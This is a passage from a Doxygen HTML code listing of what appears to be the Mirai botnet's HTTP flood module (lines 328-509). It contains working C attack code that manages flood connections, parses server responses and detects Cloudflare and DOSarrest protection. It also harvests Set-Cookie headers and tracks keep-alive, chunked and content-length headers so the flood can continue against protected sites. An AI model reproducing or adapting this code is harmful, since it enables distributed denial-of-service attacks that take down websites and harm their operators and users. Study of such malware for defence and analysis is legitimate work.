name="l00328"></a><span class="lineno">  328</span>&#160;</div><div class="line"><a name="l00329"></a><span class="lineno">  329</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> == -1)</div><div class="line"><a name="l00330"></a><span class="lineno">  330</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00331"></a><span class="lineno">  331</span>&#160;</div><div class="line"><a name="l00332"></a><span class="lineno">  332</span>&#160;            <span class="keywordflow">if</span> (FD_ISSET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_wr))</div><div class="line"><a name="l00333"></a><span class="lineno">  333</span>&#160;            {</div><div class="line"><a name="l00334"></a><span class="lineno">  334</span>&#160;                <span class="keywordtype">int</span> err = 0;</div><div class="line"><a name="l00335"></a><span class="lineno">  335</span>&#160;                socklen_t err_len = <span class="keyword">sizeof</span> (err);</div><div class="line"><a name="l00336"></a><span class="lineno">  336</span>&#160;</div><div class="line"><a name="l00337"></a><span class="lineno">  337</span>&#160;                ret = getsockopt(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, SOL_SOCKET, SO_ERROR, &amp;err, &amp;err_len);</div><div class="line"><a name="l00338"></a><span class="lineno">  338</span>&#160;                <span class="keywordflow">if</span> (err == 0 &amp;&amp; ret == 0)</div><div class="line"><a name="l00339"></a><span class="lineno">  339</span>&#160;                {</div><div class="line"><a name="l00340"></a><span class="lineno">  340</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00341"></a><span class="lineno">  341</span>&#160;                    printf(<span class="stringliteral">&quot;[http flood] FD%d connected.\n&quot;</span>, conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00342"></a><span class="lineno">  342</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00343"></a><span class="lineno">  343</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#aff008d93b76d40a67da697001e176f6b">HTTP_CONN_SEND</a>;</div><div class="line"><a name="l00344"></a><span class="lineno">  344</span>&#160;                }</div><div class="line"><a name="l00345"></a><span class="lineno">  345</span>&#160;                <span class="keywordflow">else</span></div><div class="line"><a name="l00346"></a><span class="lineno">  346</span>&#160;                {</div><div class="line"><a name="l00347"></a><span class="lineno">  347</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00348"></a><span class="lineno">  348</span>&#160;                    printf(<span class="stringliteral">&quot;[http flood] FD%d error while connecting = %d\n&quot;</span>, conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, err);</div><div class="line"><a name="l00349"></a><span class="lineno">  349</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00350"></a><span class="lineno">  350</span>&#160;                    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00351"></a><span class="lineno">  351</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00352"></a><span class="lineno">  352</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00353"></a><span class="lineno">  353</span>&#160;                    <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00354"></a><span class="lineno">  354</span>&#160;                }</div><div class="line"><a name="l00355"></a><span class="lineno">  355</span>&#160;            }</div><div class="line"><a name="l00356"></a><span class="lineno">  356</span>&#160;</div><div class="line"><a name="l00357"></a><span class="lineno">  357</span>&#160;        <span class="keywordflow">if</span> (FD_ISSET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_rd))</div><div class="line"><a name="l00358"></a><span class="lineno">  358</span>&#160;            {</div><div class="line"><a name="l00359"></a><span class="lineno">  359</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#abedf69cb8cdb85bfc7f307503fd62775">HTTP_CONN_RECV_HEADER</a>)</div><div class="line"><a name="l00360"></a><span class="lineno">  360</span>&#160;                {</div><div class="line"><a name="l00361"></a><span class="lineno">  361</span>&#160;                    <span class="keywordtype">int</span> processed = 0;</div><div class="line"><a name="l00362"></a><span class="lineno">  362</span>&#160;</div><div class="line"><a name="l00363"></a><span class="lineno">  363</span>&#160;                    <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(generic_memes, 10240);</div><div class="line"><a name="l00364"></a><span class="lineno">  364</span>&#160;                    <span class="keywordflow">if</span> ((ret = recv(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, generic_memes, 10240, MSG_NOSIGNAL | MSG_PEEK)) &lt; 1)</div><div class="line"><a name="l00365"></a><span class="lineno">  365</span>&#160;                    {</div><div class="line"><a name="l00366"></a><span class="lineno">  366</span>&#160;                        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00367"></a><span class="lineno">  367</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00368"></a><span class="lineno">  368</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00369"></a><span class="lineno">  369</span>&#160;                        <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00370"></a><span class="lineno">  370</span>&#160;                    }</div><div class="line"><a name="l00371"></a><span class="lineno">  371</span>&#160;</div><div class="line"><a name="l00372"></a><span class="lineno">  372</span>&#160;</div><div class="line"><a name="l00373"></a><span class="lineno">  373</span>&#160;                    <span class="comment">// we want to process a full http header (^:</span></div><div class="line"><a name="l00374"></a><span class="lineno">  374</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes, ret, <span class="stringliteral">&quot;\r\n\r\n&quot;</span>, 4) == -1 &amp;&amp; ret &lt; 10240)</div><div class="line"><a name="l00375"></a><span class="lineno">  375</span>&#160;                        <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00376"></a><span class="lineno">  376</span>&#160;</div><div class="line"><a name="l00377"></a><span class="lineno">  377</span>&#160;                    generic_memes[<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes, ret, <span class="stringliteral">&quot;\r\n\r\n&quot;</span>, 4)] = 0;</div><div class="line"><a name="l00378"></a><span class="lineno">  378</span>&#160;</div><div class="line"><a name="l00379"></a><span class="lineno">  379</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00380"></a><span class="lineno">  380</span>&#160;                    <span class="keywordflow">if</span> (sockets == 1)</div><div class="line"><a name="l00381"></a><span class="lineno">  381</span>&#160;                        printf(<span class="stringliteral">&quot;[http flood] headers: \&quot;%s\&quot;\n&quot;</span>, generic_memes);</div><div class="line"><a name="l00382"></a><span class="lineno">  382</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00383"></a><span class="lineno">  383</span>&#160;</div><div class="line"><a name="l00384"></a><span class="lineno">  384</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a260fbfdad3b4d569ea5bf904538e0628">TABLE_ATK_CLOUDFLARE_NGINX</a>, NULL)) != -1)</div><div class="line"><a name="l00385"></a><span class="lineno">  385</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a97f15ea73d0347511f511318f0949e86">protection_type</a> = <a class="code" href="attack_8h.html#a358ec495035a144be684ef619051366b">HTTP_PROT_CLOUDFLARE</a>;</div><div class="line"><a name="l00386"></a><span class="lineno">  386</span>&#160;</div><div class="line"><a name="l00387"></a><span class="lineno">  387</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a3e6171ef594c03bf2526e8d43c9fbdb3">TABLE_ATK_DOSARREST</a>, NULL)) != -1)</div><div class="line"><a name="l00388"></a><span class="lineno">  388</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a97f15ea73d0347511f511318f0949e86">protection_type</a> = <a class="code" href="attack_8h.html#af9036def147b9e5de7a7b981f1d6212e">HTTP_PROT_DOSARREST</a>;</div><div class="line"><a name="l00389"></a><span class="lineno">  389</span>&#160;</div><div class="line"><a name="l00390"></a><span class="lineno">  390</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#a365269c0f55832182c8a76236ea80c18">keepalive</a> = 0;</div><div class="line"><a name="l00391"></a><span class="lineno">  391</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#afdae87bf33d9c2f2407b37fab6e91628">TABLE_ATK_CONNECTION_HDR</a>, NULL)) != -1)</div><div class="line"><a name="l00392"></a><span class="lineno">  392</span>&#160;                    {</div><div class="line"><a name="l00393"></a><span class="lineno">  393</span>&#160;                        <span class="keywordtype">int</span> offset = <a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#afdae87bf33d9c2f2407b37fab6e91628">TABLE_ATK_CONNECTION_HDR</a>, NULL));</div><div class="line"><a name="l00394"></a><span class="lineno">  394</span>&#160;                        <span class="keywordflow">if</span> (generic_memes[offset] == <span class="charliteral">&#39; &#39;</span>)</div><div class="line"><a name="l00395"></a><span class="lineno">  395</span>&#160;                            offset++;</div><div class="line"><a name="l00396"></a><span class="lineno">  396</span>&#160;</div><div class="line"><a name="l00397"></a><span class="lineno">  397</span>&#160;                        <span class="keywordtype">int</span> nl_off = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + offset, ret - offset, <span class="stringliteral">&quot;\r\n&quot;</span>, 2);</div><div class="line"><a name="l00398"></a><span class="lineno">  398</span>&#160;                        <span class="keywordflow">if</span> (nl_off != -1)</div><div class="line"><a name="l00399"></a><span class="lineno">  399</span>&#160;                        {</div><div class="line"><a name="l00400"></a><span class="lineno">  400</span>&#160;                            <span class="keywordtype">char</span> *con_ptr = &amp;(generic_memes[offset]);</div><div class="line"><a name="l00401"></a><span class="lineno">  401</span>&#160;</div><div class="line"><a name="l00402"></a><span class="lineno">  402</span>&#160;                            <span class="keywordflow">if</span> (nl_off &gt;= 2)</div><div class="line"><a name="l00403"></a><span class="lineno">  403</span>&#160;                                nl_off -= 2;</div><div class="line"><a name="l00404"></a><span class="lineno">  404</span>&#160;                            generic_memes[offset + nl_off] = 0;</div><div class="line"><a name="l00405"></a><span class="lineno">  405</span>&#160;</div><div class="line"><a name="l00406"></a><span class="lineno">  406</span>&#160;                            <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(con_ptr, <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(con_ptr), <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a1665384941722febe6d2a8b1e58655be">TABLE_ATK_KEEP_ALIVE_HDR</a>, NULL)))</div><div class="line"><a name="l00407"></a><span class="lineno">  407</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#a365269c0f55832182c8a76236ea80c18">keepalive</a> = 1;</div><div class="line"><a name="l00408"></a><span class="lineno">  408</span>&#160;                        }</div><div class="line"><a name="l00409"></a><span class="lineno">  409</span>&#160;                    }</div><div class="line"><a name="l00410"></a><span class="lineno">  410</span>&#160;</div><div class="line"><a name="l00411"></a><span class="lineno">  411</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#a9ecd82038dfaf8c3677052cd20b45b16">chunked</a> = 0;</div><div class="line"><a name="l00412"></a><span class="lineno">  412</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a6bb03316c5d32d6053734ac6ceec2d82">TABLE_ATK_TRANSFER_ENCODING_HDR</a>, NULL)) != -1)</div><div class="line"><a name="l00413"></a><span class="lineno">  413</span>&#160;                    {</div><div class="line"><a name="l00414"></a><span class="lineno">  414</span>&#160;                        <span class="keywordtype">int</span> offset = <a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a6bb03316c5d32d6053734ac6ceec2d82">TABLE_ATK_TRANSFER_ENCODING_HDR</a>, NULL));</div><div class="line"><a name="l00415"></a><span class="lineno">  415</span>&#160;                        <span class="keywordflow">if</span> (generic_memes[offset] == <span class="charliteral">&#39; &#39;</span>)</div><div class="line"><a name="l00416"></a><span class="lineno">  416</span>&#160;                            offset++;</div><div class="line"><a name="l00417"></a><span class="lineno">  417</span>&#160;</div><div class="line"><a name="l00418"></a><span class="lineno">  418</span>&#160;                        <span class="keywordtype">int</span> nl_off = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + offset, ret - offset, <span class="stringliteral">&quot;\r\n&quot;</span>, 2);</div><div class="line"><a name="l00419"></a><span class="lineno">  419</span>&#160;                        <span class="keywordflow">if</span> (nl_off != -1)</div><div class="line"><a name="l00420"></a><span class="lineno">  420</span>&#160;                        {</div><div class="line"><a name="l00421"></a><span class="lineno">  421</span>&#160;                            <span class="keywordtype">char</span> *con_ptr = &amp;(generic_memes[offset]);</div><div class="line"><a name="l00422"></a><span class="lineno">  422</span>&#160;</div><div class="line"><a name="l00423"></a><span class="lineno">  423</span>&#160;                            <span class="keywordflow">if</span> (nl_off &gt;= 2)</div><div class="line"><a name="l00424"></a><span class="lineno">  424</span>&#160;                                nl_off -= 2;</div><div class="line"><a name="l00425"></a><span class="lineno">  425</span>&#160;                            generic_memes[offset + nl_off] = 0;</div><div class="line"><a name="l00426"></a><span class="lineno">  426</span>&#160;</div><div class="line"><a name="l00427"></a><span class="lineno">  427</span>&#160;                            <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(con_ptr, <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(con_ptr), <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a89772e3bed797cb16a658f935bc8c37b">TABLE_ATK_CHUNKED</a>, NULL)))</div><div class="line"><a name="l00428"></a><span class="lineno">  428</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#a9ecd82038dfaf8c3677052cd20b45b16">chunked</a> = 1;</div><div class="line"><a name="l00429"></a><span class="lineno">  429</span>&#160;                        }</div><div class="line"><a name="l00430"></a><span class="lineno">  430</span>&#160;                    }</div><div class="line"><a name="l00431"></a><span class="lineno">  431</span>&#160;</div><div class="line"><a name="l00432"></a><span class="lineno">  432</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a98de50549fdb839f2ba413f44e0d3e6a">TABLE_ATK_CONTENT_LENGTH_HDR</a>, NULL)) != -1)</div><div class="line"><a name="l00433"></a><span class="lineno">  433</span>&#160;                    {</div><div class="line"><a name="l00434"></a><span class="lineno">  434</span>&#160;                        <span class="keywordtype">int</span> offset = <a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a98de50549fdb839f2ba413f44e0d3e6a">TABLE_ATK_CONTENT_LENGTH_HDR</a>, NULL));</div><div class="line"><a name="l00435"></a><span class="lineno">  435</span>&#160;                        <span class="keywordflow">if</span> (generic_memes[offset] == <span class="charliteral">&#39; &#39;</span>)</div><div class="line"><a name="l00436"></a><span class="lineno">  436</span>&#160;                            offset++;</div><div class="line"><a name="l00437"></a><span class="lineno">  437</span>&#160;</div><div class="line"><a name="l00438"></a><span class="lineno">  438</span>&#160;                        <span class="keywordtype">int</span> nl_off = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + offset, ret - offset, <span class="stringliteral">&quot;\r\n&quot;</span>, 2);</div><div class="line"><a name="l00439"></a><span class="lineno">  439</span>&#160;                        <span class="keywordflow">if</span> (nl_off != -1)</div><div class="line"><a name="l00440"></a><span class="lineno">  440</span>&#160;                        {</div><div class="line"><a name="l00441"></a><span class="lineno">  441</span>&#160;                            <span class="keywordtype">char</span> *len_ptr = &amp;(generic_memes[offset]);</div><div class="line"><a name="l00442"></a><span class="lineno">  442</span>&#160;</div><div class="line"><a name="l00443"></a><span class="lineno">  443</span>&#160;                            <span class="keywordflow">if</span> (nl_off &gt;= 2)</div><div class="line"><a name="l00444"></a><span class="lineno">  444</span>&#160;                                nl_off -= 2;</div><div class="line"><a name="l00445"></a><span class="lineno">  445</span>&#160;                            generic_memes[offset + nl_off] = 0;</div><div class="line"><a name="l00446"></a><span class="lineno">  446</span>&#160;</div><div class="line"><a name="l00447"></a><span class="lineno">  447</span>&#160;                            conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> = <a class="code" href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a>(len_ptr, 10);</div><div class="line"><a name="l00448"></a><span class="lineno">  448</span>&#160;                        }</div><div class="line"><a name="l00449"></a><span class="lineno">  449</span>&#160;                    } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00450"></a><span class="lineno">  450</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a872e7657446a595ea0704fc5c07c4586">content_length</a> = 0;</div><div class="line"><a name="l00451"></a><span class="lineno">  451</span>&#160;                    }</div><div class="line"><a name="l00452"></a><span class="lineno">  452</span>&#160;</div><div class="line"><a name="l00453"></a><span class="lineno">  453</span>&#160;                    processed = 0;</div><div class="line"><a name="l00454"></a><span class="lineno">  454</span>&#160;                    <span class="keywordflow">while</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes + processed, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a31f1bf8dcf162592001058f12362eb55">TABLE_ATK_SET_COOKIE_HDR</a>, NULL)) != -1 &amp;&amp; conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a> &lt; <a class="code" href="attack_8h.html#a7afb6e2da31b70aad81a3a8c4cce03ac">HTTP_COOKIE_MAX</a>)</div><div class="line"><a name="l00455"></a><span class="lineno">  455</span>&#160;                    {</div><div class="line"><a name="l00456"></a><span class="lineno">  456</span>&#160;                        <span class="keywordtype">int</span> offset = <a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes + processed, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a31f1bf8dcf162592001058f12362eb55">TABLE_ATK_SET_COOKIE_HDR</a>, NULL));</div><div class="line"><a name="l00457"></a><span class="lineno">  457</span>&#160;                        <span class="keywordflow">if</span> (generic_memes[processed + offset] == <span class="charliteral">&#39; &#39;</span>)</div><div class="line"><a name="l00458"></a><span class="lineno">  458</span>&#160;                            offset++;</div><div class="line"><a name="l00459"></a><span class="lineno">  459</span>&#160;</div><div class="line"><a name="l00460"></a><span class="lineno">  460</span>&#160;                        <span class="keywordtype">int</span> nl_off = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + processed + offset, ret - processed - offset, <span class="stringliteral">&quot;\r\n&quot;</span>, 2);</div><div class="line"><a name="l00461"></a><span class="lineno">  461</span>&#160;                        <span class="keywordflow">if</span> (nl_off != -1)</div><div class="line"><a name="l00462"></a><span class="lineno">  462</span>&#160;                        {</div><div class="line"><a name="l00463"></a><span class="lineno">  463</span>&#160;                            <span class="keywordtype">char</span> *cookie_ptr = &amp;(generic_memes[processed + offset]);</div><div class="line"><a name="l00464"></a><span class="lineno">  464</span>&#160;</div><div class="line"><a name="l00465"></a><span class="lineno">  465</span>&#160;                            <span class="keywordflow">if</span> (nl_off &gt;= 2)</div><div class="line"><a name="l00466"></a><span class="lineno">  466</span>&#160;                                nl_off -= 2;</div><div class="line"><a name="l00467"></a><span class="lineno">  467</span>&#160;</div><div class="line"><a name="l00468"></a><span class="lineno">  468</span>&#160;                            <span class="keywordflow">if</span> (<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + processed + offset, ret - processed - offset, <span class="stringliteral">&quot;;&quot;</span>, 1) &gt; 0)</div><div class="line"><a name="l00469"></a><span class="lineno">  469</span>&#160;                                nl_off = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + processed + offset, ret - processed - offset, <span class="stringliteral">&quot;;&quot;</span>, 1) - 1;</div><div class="line"><a name="l00470"></a><span class="lineno">  470</span>&#160;</div><div class="line"><a name="l00471"></a><span class="lineno">  471</span>&#160;                            generic_memes[processed + offset + nl_off] = 0;</div><div class="line"><a name="l00472"></a><span class="lineno">  472</span>&#160;</div><div class="line"><a name="l00473"></a><span class="lineno">  473</span>&#160;                            <span class="keywordflow">for</span> (ii = 0; ii &lt; <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(cookie_ptr); ii++)</div><div class="line"><a name="l00474"></a><span class="lineno">  474</span>&#160;                                <span class="keywordflow">if</span> (cookie_ptr[ii] == <span class="charliteral">&#39;=&#39;</span>)</div><div class="line"><a name="l00475"></a><span class="lineno">  475</span>&#160;                                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00476"></a><span class="lineno">  476</span>&#160;</div><div class="line"><a name="l00477"></a><span class="lineno">  477</span>&#160;                            <span class="keywordflow">if</span> (cookie_ptr[ii] == <span class="charliteral">&#39;=&#39;</span>)</div><div class="line"><a name="l00478"></a><span class="lineno">  478</span>&#160;                            {</div><div class="line"><a name="l00479"></a><span class="lineno">  479</span>&#160;                                <span class="keywordtype">int</span> equal_off = ii, cookie_exists = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>;</div><div class="line"><a name="l00480"></a><span class="lineno">  480</span>&#160;</div><div class="line"><a name="l00481"></a><span class="lineno">  481</span>&#160;                                <span class="keywordflow">for</span> (ii = 0; ii &lt; conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>; ii++)</div><div class="line"><a name="l00482"></a><span class="lineno">  482</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a983759d15797446fba097be4fd7654fb">util_strncmp</a>(cookie_ptr, conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[ii], equal_off))</div><div class="line"><a name="l00483"></a><span class="lineno">  483</span>&#160;                                    {</div><div class="line"><a name="l00484"></a><span class="lineno">  484</span>&#160;                                        cookie_exists = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00485"></a><span class="lineno">  485</span>&#160;                                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00486"></a><span class="lineno">  486</span>&#160;                                    }</div><div class="line"><a name="l00487"></a><span class="lineno">  487</span>&#160;</div><div class="line"><a name="l00488"></a><span class="lineno">  488</span>&#160;                                <span class="keywordflow">if</span> (!cookie_exists)</div><div class="line"><a name="l00489"></a><span class="lineno">  489</span>&#160;                                {</div><div class="line"><a name="l00490"></a><span class="lineno">  490</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(cookie_ptr) &lt; <a class="code" href="attack_8h.html#a843d2259e52b51843a2abe0bfb764dc4">HTTP_COOKIE_LEN_MAX</a>)</div><div class="line"><a name="l00491"></a><span class="lineno">  491</span>&#160;                                    {</div><div class="line"><a name="l00492"></a><span class="lineno">  492</span>&#160;                                        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a93cf57948e424620047d9381b73f8fcd">cookies</a>[conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>], cookie_ptr);</div><div class="line"><a name="l00493"></a><span class="lineno">  493</span>&#160;                                        conn-&gt;<a class="code" href="structattack__http__state.html#a1b80b17b3f367edadba69edf86f03f0c">num_cookies</a>++;</div><div class="line"><a name="l00494"></a><span class="lineno">  494</span>&#160;                                    }</div><div class="line"><a name="l00495"></a><span class="lineno">  495</span>&#160;                                }</div><div class="line"><a name="l00496"></a><span class="lineno">  496</span>&#160;                            }</div><div class="line"><a name="l00497"></a><span class="lineno">  497</span>&#160;                        }</div><div class="line"><a name="l00498"></a><span class="lineno">  498</span>&#160;</div><div class="line"><a name="l00499"></a><span class="lineno">  499</span>&#160;                        processed += offset;</div><div class="line"><a name="l00500"></a><span class="lineno">  500</span>&#160;                    }</div><div class="line"><a name="l00501"></a><span class="lineno">  501</span>&#160;</div><div class="line"><a name="l00502"></a><span class="lineno">  502</span>&#160;                    <span class="comment">// this will still work as previous handlers will only add in null chars or similar</span></div><div class="line"><a name="l00503"></a><span class="lineno">  503</span>&#160;                    <span class="comment">// and we specify the size of the string to stristr</span></div><div class="line"><a name="l00504"></a><span class="lineno">  504</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a0fcf8e231e646aaed0d7fcb495da1935">TABLE_ATK_LOCATION_HDR</a>, NULL)) != -1)</div><div class="line"><a name="l00505"></a><span class="lineno">  505</span>&#160;                    {</div><div class="line"><a name="l00506"></a><span class="lineno">  506</span>&#160;                        <span class="keywordtype">int</span> offset = <a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a0fcf8e231e646aaed0d7fcb495da1935">TABLE_ATK_LOCATION_HDR</a>, NULL));</div><div class="line"><a name="l00507"></a><span class="lineno">  507</span>&#160;                        <span class="keywordflow">if</span> (generic_memes[offset] == <span class="charliteral">&#39; &#39;</span>)</div><div class="line"><a name="l00508"></a><span class="lineno">  508</span>&#160;                            offset++;</div><div class="line"><a name="l00509"></a><span class="lineno">  509</span>&#160;</div><div class="line"><a 